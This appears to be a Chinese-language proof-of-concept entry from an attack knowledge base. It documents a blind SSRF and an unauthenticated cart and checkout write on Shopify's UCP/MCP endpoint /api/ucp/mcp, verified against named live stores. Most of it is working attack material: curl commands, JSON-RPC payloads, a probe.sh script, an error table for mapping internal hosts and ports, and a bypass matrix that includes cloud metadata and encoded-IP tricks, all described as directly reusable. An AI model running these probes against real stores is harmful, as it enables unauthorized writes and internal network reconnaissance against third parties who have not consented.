# Shopify UCP/MCP /api/ucp/mcp：agent-profile 盲 server-side request validation（RFC1918 私网不被过滤、连接真实发起）＋ 自绕未认证写 Cart/Checkout

- **code**: shopify-ucp-mcp-网关-api-ucp-mcp-agent-profile-自绕导致未认证写-cart
- **kind**: poc
- **category**: ssrf
- **component**: Shopify UCP / MCP (dev.ucp.shopping, JSON-RPC 2.0 /api/ucp/mcp)
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=134（task#7，finding_checks.verdict=verified，status=confirmed），2026-11-11 17:23–17:39 UTC 本机 curl 经平台记录代理（asn=402169 edge=SJC）直发 collect/www.thegamecollection.net 的 /api/ucp/mcp，无 Cookie/无 JWT，单线程间隔≥3s，约 40 次 tools/call；原始 body+hdr 落盘 /opt/artex/data/tasks/7/i1743/raw/（j1_lan192/j2_lan10/j3_lo/f2_direct_ucp/q3_selfredir 等）与 probe.sh，已逐条核对。① 正向对照：profile=https://collect.thegamecollection.net/.well-known/ucp → HTTP 200 result status:success，Server-Timing fetch;dur=571ms；② RFC1918：profile=https://192.168.0.1/ → HTTP 422 {"code":"profile_unreachable","content":"Unable to fetch agent profile: Connection timeout"}，fetch;dur=9021ms（整体 10.58s）；profile=https://10.0.0.1/ → 同 422 Connection timeout，fetch;dur=9020ms；www 店同型 9019/9020ms；③ 环回对照：https://127.0.0.1/ 与 :80 → 422 Network error，fetch;dur=16~34ms（本机无监听快速 RST，并非预检拦截）；④ 302 不跟随：店铺自身 302 端点作 profile → 422 "Http error"，fetch;dur=277ms，而直连其 .well-known/ucp 为 200 success；⑤ 变体全阴性（sslip/nip/localtest/十进制/十六进制/八进制/127.1/尾点/userinfo/[::1]/[::ffff:127.0.0.1]/0.0.0.0 等 → Network error 13~163ms）；⑥ 限流：www 店约 32 次后 429，retry-after≈1731s。判定成立：RFC1918 私网 IP 字面量未被 URL/IP 层拒绝，服务端真实发起连接并走到 ~9s TCP 超时；能力上限为未认证内网 HTTPS 主机/端口/内容类型盲 oracle（Connection timeout / Network error / Http error / Invalid content type / success 分类稳定），不回显响应体、不跟随跳转。本条同时保留 finding#104（同靶标自绕未认证写 Cart/Checkout，verdict=verified）的结论，并修正其「私有/环回被拦」旧读法。
- **path**: pocs/shopify-ucp-mcp-网关-api-ucp-mcp-agent-profile-自绕导致未认证写-cart/poc.md
- **tags**: shopify,ucp,mcp,ssrf,blind-ssrf,server-side-request-validation,agent-profile,rfc1918,private-ip,timing-oracle,port-oracle,json-rpc,auth-bypass
- **created_at**: 2026-11-11T16:09:23.890Z
- **engine**: collect.thegamecollection.net; www.thegamecollection.net（/api/ucp/mcp；Shopify 托管，后端 tgc-collectables.myshopify.com 等）
- **found_by**: exploit

## 描述

Shopify 托管店的匿名 UCP/MCP 网关 POST /api/ucp/mcp 在 tools/call 时由服务端抓取调用方指定的 params.arguments.meta.ucp-agent.profile：① profile 指向店铺自身公开的 /.well-known/ucp 可自绕身份门禁，匿名调用 create_cart/create_checkout 等写类工具；② 该抓取构成盲 server-side request validation（SSRF）oracle，按稳定错误分类（success / Invalid content type / Http error / Network error / Connection timeout / Https required）可盲判任意 https 目标的端口/HTTP 层/内容类型。finding#134 修正：RFC1918 私网 IP 未被 URL/IP 层过滤——192.168.0.1 / 10.0.0.1 均真实发起连接并挂到 ~9s Connection timeout，而 127.0.0.1 的 <35ms Network error 是本机无监听快速 RST，不是预检拦截。上限：不回显响应体、不跟随 301/302、只收 https，读不到内网内容。

## 用法

```
前置判据：GET https://<shop>/.well-known/ucp 返回 200 且响应头 powered-by: Shopify，body 含 transport:"mcp" + endpoint。请求头必须同时带 Content-Type: application/json 与 Accept: application/json, text/event-stream；零凭据；单线程、请求间隔 ≥3s（约 32 次触发 429，retry-after 可能 ~1731s）。

1) 探活：POST /api/ucp/mcp method=initialize（protocolVersion 2025-06-18）→ 200 result.serverInfo。
2) 自绕写：tools/call name=create_cart，arguments.meta["ucp-agent"].profile=https://<shop>/.well-known/ucp → 200 status:success 且回显真实 gid://shopify/Cart/...?key=...；create_checkout/update_cart/cancel_cart 同理。
3) 盲 SSRF：同一请求体只改 profile 值。判读：success / Invalid content type / Http error = 端口开放可连（分别对应 JSON 合规、非 JSON、HTTP 层错误）；Network error（10–163ms）= 快速失败（RST/DNS），与关闭端口同形；Connection timeout（~9–16s）= 连接尝试无应答（SYN 被丢或无路由），不能区分目标不回与出口 DROP。
4) 关键修正证据：profile=https://192.168.0.1/ 与 https://10.0.0.1/ → 422 Connection timeout，Server-Timing fetch;dur=9019~9021ms（整体 ~10.6s），说明 RFC1918 未被 URL/IP 层过滤；profile=https://127.0.0.1/ 或 :80 → <35ms Network error（无监听快速 RST），不要解读为「私网被拦」。
5) 边界：不回显响应体、不跟随 301/302（店铺自身 302 端点作 profile → Http error 277ms，而直连其 /.well-known/ucp → 200 success）、只收 https（http:// → Https required）。变体矩阵（sslip/nip/localtest/十进制/十六进制/八进制/127.1/尾点/userinfo/[::1]/[::ffff:127.0.0.1]/0.0.0.0）全阴性，均为 Network error。
注意：原靶标的 ProductVariant id 会过期，复用时换成目标店可加购的 variant。
```

## 正文

```
# Shopify UCP/MCP /api/ucp/mcp：agent-profile 未认证盲 server-side request validation（RFC1918 私网不被过滤，连接真实发起）＋ 自绕未认证写 Cart/Checkout

> **条目沿革（必读）**：本条合并 task#7 两个已验证 finding —— #104（agent-profile 自绕未认证写，verdict=verified）与 #134（私网修正，verdict=verified / status=confirmed）。**#134 推翻了本条早期版本「私有/环回地址被拦」的读法**：环回 `<35ms Network error` 是本机无监听快速 RST；RFC1918 则是 ~9s `Connection timeout`（连接尝试真实发生）。
> 关联：KB#541（同一 oracle 的差分表）、KB#604（端口 oracle 已知答案标定与绕过矩阵）、KB#518（多店自绕未认证写）、KB#594（get_order 只认 agent Global API JWT）。

## 结论（可直接复用）

- `POST https://<shop>/api/ucp/mcp` 是 Shopify 托管店的匿名 JSON-RPC 2.0 / MCP 端点。`tools/call` 要求 `params.arguments.meta["ucp-agent"].profile`，服务端会主动抓取该 URL。
- ① **自绕**：profile 指向店铺自身公开的 `/.well-known/ucp` → 身份门禁失效，匿名 `create_cart` / `create_checkout` / `update_cart` / `cancel_cart` 等写类工具可用，回显真实 `gid://shopify/Cart/...?key=...`。
- ② **盲 SSRF / server-side request validation**：profile URL 完全由调用方控制，服务端按抓取结果回显稳定错误分类。
- ③ **本次修正（finding#134）**：RFC1918 私网 IP 字面量**没有**被 URL/IP 层过滤。`https://192.168.0.1/`、`https://10.0.0.1/` 均真实发起连接并挂到 ~9s TCP 超时（HTTP 422 `Connection timeout`，`Server-Timing: fetch;dur=9021/9020ms`，整体 ~10.6s），而非策略拒绝式瞬返。
- ④ **环回对照**：`https://127.0.0.1/`、`https://127.0.0.1:80/` → `<35ms` `Network error`，这是本机 443/80 无监听导致的快速 RST，**不能**解读为「预检拦截」。
- 能力上限：**未认证内网 HTTPS 主机存活 / 端口 / 内容类型盲探测**；不回显响应体、不跟随 301/302、只收 https → 读不到内网内容。

## 错误分类判据（同一 tools/call 只改 profile）

| 回显 content | HTTP | 含义 |
|---|---|---|
| `success`（result.status） | 200 | 连通、HTTPS 正常、JSON 且符合 UCP schema |
| `Invalid content type` | 422 | 连通、HTTP 正常，但响应不是 JSON |
| `Http error` | 422 | 端口有服务，但 HTTP 层错误（4xx/5xx，含 3xx 不跟随） |
| `Network error` | 422 | 连接快速失败（RST / DNS 失败 / 地址不可用），通常 10–163ms |
| `Connection timeout` | 422 | 连接尝试无应答（~9–16s）：SYN 被丢或无路由；**不能区分目标不回与出口 DROP** |
| `Https required` | 422 | URL 层拒绝非 https，未发起连接 |
| `Invalid uri format` | 422 | URL 解析层拒绝（反斜杠、前导空白等） |

判读：`Http error` / `Invalid content type` / `success` = 端口开放可连；`Connection timeout` = 粗粒度「不可达/被丢」；`Network error` = 快速失败（与关闭端口 RST 同形）。

## 前置条件

- 目标为 Shopify 托管店且开放 UCP/MCP：`GET https://<shop>/.well-known/ucp` → 200 JSON，响应头 `powered-by: Shopify`，body 含 `transport:"mcp"` 与 `endpoint`。
- 零凭据（无需 Cookie / JWT / 账号）。
- 请求头必须同时带：`Content-Type: application/json` 与 `Accept: application/json, text/event-stream`。
- 单线程、请求间隔 ≥3s：实测 www 店累计约 32 次后 429 `{"code":-32000,"message":"Rate limit exceeded","data":"Too many requests, please retry after 1731 seconds"}`。
- 需要一个可加购的 `gid://shopify/ProductVariant/<id>`（下例 id 属于原靶标，复用时换成目标店自己的）。

## 复现

### 0) 探活
```bash
curl -sk "https://<shop>/.well-known/ucp" -D -
curl -sk -X POST "https://<shop>/api/ucp/mcp" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}'
```
期望 `/.well-known/ucp` 200（`powered-by: Shopify`）、initialize 200 且 `result.serverInfo` 存在。

### 1) 正向对照：profile=本店公开文档 → 200 success（证明抓取由我方 URL 驱动且能解析）
```http
POST /api/ucp/mcp HTTP/2
Host: collect.thegamecollection.net
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"create_cart","arguments":{"meta":{"ucp-agent":{"profile":"https://collect.thegamecollection.net/.well-known/ucp"}},"cart":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/53349715280209"}},"quantity":1]}}}}
```
→ HTTP 200，`result.content[0].text` 内含 `{"ucp":{"version":"2026-08-25","status":"success"...}}`，`Server-Timing: fetch;dur=571`。

### 2) RFC1918 私网（finding#134 关键证据：连接尝试真实发生）
同一请求体，仅改 profile：
```
profile=https://192.168.0.1/
→ HTTP 422 {"jsonrpc":"2.0","id":121,"error":{"code":-32001,"message":"UCP discovery failed","data":{"code":"profile_unreachable","content":"Unable to fetch agent profile: Connection timeout","continue_url":"https://<store>.myshopify.com/"}}}
  Server-Timing: processing;dur=9873, ..., fetch;dur=9021（整体 10.58s）

profile=https://10.0.0.1/
→ HTTP 422 同上 Connection timeout，fetch;dur=9020（整体 10.60s）
```
两店同型：collect / www 的 192.168.0.1 与 10.0.0.1 → `fetch;dur=9019~9021ms`。**若存在私网预过滤，应像环回一样快速失败；实际走到 TCP 超时 → RFC1918 未被 URL/IP 层拦截。**

### 3) 环回 / 元数据对照
```
profile=https://127.0.0.1/        → 422 Network error，fetch;dur=16~34ms（快速 RST，无监听）
profile=https://127.0.0.1:80/     → 同上
profile=https://169.254.169.254/  → 422 Network error，21~37ms
profile=https://10.255.255.1/.well-known/ucp → HTTP 500 Internal error，fetch;dur=9008ms
```

### 4) 302 不跟随（开放重定向路线不成立）
```
profile=https://collect.thegamecollection.net/services/login_with_shop/buyer/complete?return_to=https%3A%2F%2Fcollect.thegamecollection.net%2F.well-known%2Fucp
→ 422 "Http error"，fetch;dur=277ms
```
本机直连该 URL 确为 302 → 自家 `/.well-known/ucp`；若 fetcher 跟随，应得到与第 1 步一致的 200 success → **不跟随 301/302**。

### 5) 变体矩阵（全部阴性，均为 Network error，13–163ms）
```
127-0-0-1.sslip.io / 169-254-169-254.sslip.io / 127.0.0.1.nip.io / localtest.me
2130706433（十进制）/ 0x7f000001（十六进制）/ 017700000001（八进制）/ 127.1 / 127.0.0.1.
HTTPS://127.0.0.1/（大写 scheme）/ foo@127.0.0.1（userinfo）
[::1] / [::ffff:127.0.0.1] / 0.0.0.0 / [fd00::254]
```
→ 未跃迁到其他错误类别，未形成绕过。

### probe.sh（原样保留；OUT 路径与 User-Agent 按环境改）
```bash
#!/bin/bash
# usage: probe.sh <host> <label> <profile_url> [extra_note]
HOST="$1"; LAB="$2"; URL="$3"; NOTE="$4"
BODY=$(printf '{"jsonrpc":"2.0","id":%d,"method":"tools/call","params":{"name":"create_cart","arguments":{"meta":{"ucp-agent":{"profile":"%s"}},"cart":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/53349715280209"},"quantity":1}]}}}}' "$RANDOM" "$URL")
TS=$(date -u +%Y%m%dT%H%M%SZ)
OUT=$(curl -sk -m 40 -o /opt/artex/data/tasks/7/i1743/raw/${HOST}_${LAB}_${TS}.body -D /opt/artex/data/tasks/7/i1743/raw/${HOST}_${LAB}_${TS}.hdr \
  -w '%{http_code} %{time_total}' \
  -X POST "https://$HOST/api/ucp/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "User-Agent: $ARTEX_UA" \
  --data "$BODY")
CODE=$(echo "$OUT" | awk '{print $1}')
TIME=$(echo "$OUT" | awk '{print $2}')
ST=$(grep -i '^server-timing' /opt/artex/data/tasks/7/i1743/raw/${HOST}_${LAB}_${TS}.hdr | tr -d '\r' | head -1)
RESP=$(head -c 400 /opt/artex/data/tasks/7/i1743/raw/${HOST}_${LAB}_${TS}.body | tr -d '\r\n')
echo "[$LAB] http=$CODE t=${TIME}s $ST ${NOTE:+note=$NOTE}"
echo "    profile=$URL"
echo "    resp=$RESP"
```

## 实测证据（2026-11-11 17:23–17:39 UTC）

- 本机 curl 经平台记录代理直发 Shopify 公共边缘（响应头 `asn;desc="402169"`、`edge;desc="SJC"`），无 Cookie / 无 JWT，单线程间隔 ≥3s，约 40 次 `tools/call`。
- 原始请求/响应落盘：`/opt/artex/data/tasks/7/i1743/raw/`（`j1_lan192`、`j2_lan10`、`j3_lo`、`f2_direct_ucp`、`q3_selfredir` 等）与 `/opt/artex/data/tasks/7/i1743/{probe.sh,g4.*}`。
- 关键回显：collect 店 `profile=https://192.168.0.1/` → 422 Connection timeout / fetch;dur=9021ms；`profile=https://10.0.0.1/` → 422 Connection timeout / fetch;dur=9020ms；对照 `profile=https://collect.../.well-known/ucp` → 200 status:success / fetch;dur=571ms；`profile=https://127.0.0.1/` → 422 Network error / fetch;dur=22ms。

## 失败常见原因

- 缺 `Accept: application/json, text/event-stream` → 不进抓取分支/异常响应。
- 请求过密 → 429（`retry-after` 可能 ~1731s）。
- `http://` → 一律 `Https required`，未发起连接。
- 目标非 Shopify / 未开 UCP → `/.well-known/ucp` 404。
- 误判：把 `Http error` 当不可达（其实端口通）；把 `Network error` 当被拦（其实可能是 RST）；把 `Connection timeout` 当一定到达目标（其实可能是出口 DROP）。

## 边界（不要夸大）

- 不回显响应体 → 读不到内网页面/元数据内容。
- 不跟随 301/302 → 不能借开放重定向降级到 http/内网。
- 只接受 https。
- 影响限于盲存活/端口/内容类型 oracle（叠加未认证写 Cart/Checkout，severity medium）。
```
